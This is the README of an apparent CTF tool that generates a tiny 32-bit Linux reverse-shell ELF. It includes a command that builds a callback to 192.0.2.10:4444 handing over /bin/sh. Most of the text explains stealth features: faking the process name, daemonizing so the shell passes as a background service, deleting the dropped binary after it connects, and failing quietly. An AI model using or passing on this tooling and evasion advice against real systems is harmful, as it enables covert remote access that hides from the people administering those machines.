# Minimal reverse shell generator

A maintained, deterministic version of the `minimized_revsh` CTF utility. It
builds a 32-bit Linux flat ELF callback using the `int 0x80` socketcall ABI,
with features aimed at surviving on an Attack-Defense CTF box once deployed:

- IPv4 TCP reverse callback → `/bin/sh`
- custom `argv[0]` for the process-listing behavior used by the challenge
- daemonize (fork + setsid) so the process reads as a background service
- self-destruct: unlink the dropped binary once the callback is live
- configurable shell executable and any TCP port for custom service setups
- clean, deterministic generation with input validation and unit tests

Use only on systems and CTF targets where you have authorization.

## Setup

Run `./dependencies.sh` on Debian or Ubuntu, or install NASM manually. The
generator only needs NASM; `ld` is not required for a flat binary.

## Usage

```sh
python3 generate_elf.py <IP_ADDRESS> <PORT> <CUSTOM_PROCESS_NAME> [options]
```

| option | default | purpose |
| ------ | ------- | ------- |
| `-o PATH` | `vuln` | ELF output path |
| `--asm-output PATH` | `vuln.asm` | generated NASM source |
| `--no-daemonize` | daemonize on | run attached to the caller's session |
| `--drop-path PATH` | off | unlink this file (your own binary) after the callback connects |
| `--shell PATH` | `/bin//sh` | shell executable handed to `execve` |

Example:

```sh
python3 generate_elf.py 192.0.2.10 4444 worker \
    -o ./vuln --asm-output ./vuln.asm \
    --drop-path /tmp/worker
```

The IP and port are plain arguments, so the callback can target a service
running on any port the game uses. Deploy by copying `vuln` to exactly the
`--drop-path` location and executing it; the self-destruct only works if that
path matches the real deployment path. The resulting ELF is 32-bit x86 Linux
and requires a listener on the configured address and port.

## How the survival features work

- **Process listing.** `argv[0]` is whatever `CUSTOM_PROCESS_NAME` is, so
  `ps aux` shows that name. After `execve`, the kernel resets the process
  `comm` field (what `top`, `htop`, and `ps -o comm` show) to the shell's
  basename — `sh` by default. To keep the two consistent on a target, set
  `--shell` to a shell that exists there and pick a matching name (e.g.
  `--shell /bin//sh` with name `sh`), or pick a plausible helper-process name.
- **Daemonize.** The payload forks; the parent exits and the child calls
  `setsid()`, so the callback has PPID 1 and no controlling terminal and reads
  as an ordinary background service rather than a child of the exploit. Pass
  `--no-daemonize` to restore the original behavior.
- **Self-destruct.** After a successful connect the payload `unlink`s the
  binary at `--drop-path`. The running image is already in memory and
  `execve` targets `/bin/sh`, so deleting the file is safe. A wrong path is
  ignored (the file just stays), and a failed connect leaves the file in place
  for a retry.
- **Failure handling.** A failed `socket`/`connect` exits quietly instead of
  leaving a broken shell process behind.

Keep names, shell paths, and the drop path short — payload size grows with
their UTF-8 byte length. Typical sizes: ~210 bytes with `--no-daemonize`,
~235 bytes with daemonize, ~260 bytes once a short `--drop-path` is added.

## Tests

The unit tests do not require NASM:

```sh
python3 -m unittest discover -s tests -v
```
